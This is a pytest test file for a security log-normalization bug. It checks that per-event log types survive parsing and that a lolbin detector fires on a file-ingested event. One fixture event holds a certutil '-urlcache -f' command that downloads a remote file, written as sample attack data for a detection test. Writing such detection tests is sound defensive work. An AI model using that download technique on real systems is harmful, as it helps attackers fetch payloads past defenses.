"""P4-1 (migration Phase 4, found live 2026-11-23): normalize_entries
clobbers explicit per-event log types with a file-level inference.

The field map correctly maps the raw ``log_type`` field to the canonical
``type`` — then the inference pass overwrites EVERY entry with one type
guessed from the FIRST entry's fields. A course day-file (13,960
endpoint + 5,020 auth events, each carrying an explicit ``log_type``)
normalized to 18,980 "network" events. Endpoint-gated detectors (lolbin,
unusual_process, parent-child) never fire on file-ingested data, and
auth-gated detectors only fire when the file's first entry happens to
infer "auth". Found by the Phase 4 clip-12 fixture: a certutil process
event carrying source_ip + dest_ip inferred "network" and the lolbin
detection skipped it — clip 12 cannot fire on camera.

Contract after the fix: an entry's EXPLICIT type (from the log_type /
type field mapping) is preserved. The file-level inference only fills
entries that carry no type of their own. An explicit log_type PARAM
still overrides everything (SIEM queries are authoritative for their
own type).
"""
import json

import pytest


def _write(tmp_path, events):
    p = tmp_path / "mixed.jsonl"
    p.write_text("\n".join(json.dumps(e) for e in events) + "\n")
    return str(p)


MIXED = [
    # Endpoint event carrying IPs: the old inference called this "network"
    {
        "timestamp": "2026-08-16T04:00:05.000000Z",
        "log_type": "endpoint",
        "user": "smith",
        "host": "h1",
        "source_ip": "172.31.47.243",
        "dest_ip": "185.42.7.70",
        "process": "certutil.exe",
        "command_line": "certutil.exe -urlcache -f http://x/y b64.txt",
        "action": "process_start",
    },
    # Auth event in the same file
    {
        "timestamp": "2026-08-16T05:00:05.000000Z",
        "log_type": "auth",
        "user": "smith",
        "host": "h1",
        "source_ip": "172.31.47.243",
        "action": "login_success",
    },
    # No type signal at all: inference fills this one
    {
        "timestamp": "2026-08-16T06:00:05.000000Z",
        "user": "smith",
        "action": "login_success",
    },
]


class TestTypePreservation:
    def test_explicit_per_event_types_survive_normalization(self, tmp_path):
        """RED witness: explicit log_type fields must not be clobbered."""
        from nabla.parsers import parse_file, normalize_entries

        entries = normalize_entries(
            parse_file(_write(tmp_path, MIXED)), log_type=None, column_map=None
        )
        types = [e.get("type") for e in entries]
        assert types[0] == "endpoint", (
            f"explicit endpoint event clobbered to {types[0]!r} — "
            "lolbin/unusual_process detectors never see it"
        )
        assert types[1] == "auth", f"explicit auth event clobbered to {types[1]!r}"

    def test_inference_fills_only_untyped_entries(self, tmp_path):
        """Gap entries (no type field) get the file-level inference."""
        from nabla.parsers import parse_file, normalize_entries

        entries = normalize_entries(
            parse_file(_write(tmp_path, MIXED)), log_type=None, column_map=None
        )
        assert entries[2].get("type") in ("auth", "network", "dns", "endpoint")

    def test_explicit_param_still_overrides(self, tmp_path):
        """The log_type param (SIEM query path) stays authoritative."""
        from nabla.parsers import parse_file, normalize_entries

        entries = normalize_entries(
            parse_file(_write(tmp_path, MIXED)), log_type="auth", column_map=None
        )
        assert all(e.get("type") == "auth" for e in entries)

    def test_lolbin_fires_on_file_ingested_endpoint_event(self, tmp_path):
        """The clip-12 path end-to-end: certutil through the real file
        parse + normalize must reach the lolbin detector typed endpoint."""
        from nabla.detection import detect_anomalies
        from nabla.parsers import parse_file, normalize_entries
        from nabla.pipeline.clock_ingestion import normalize_and_validate

        entries = normalize_entries(
            parse_file(_write(tmp_path, MIXED[:1])), log_type=None, column_map=None
        )
        out = detect_anomalies(normalize_and_validate(entries), {})
        anoms = out[0] if isinstance(out, tuple) else out
        methods = {a.get("detection_method") for a in anoms}
        assert "lolbin" in methods, (
            f"lolbin did not fire on a file-ingested certutil event; got {methods}"
        )
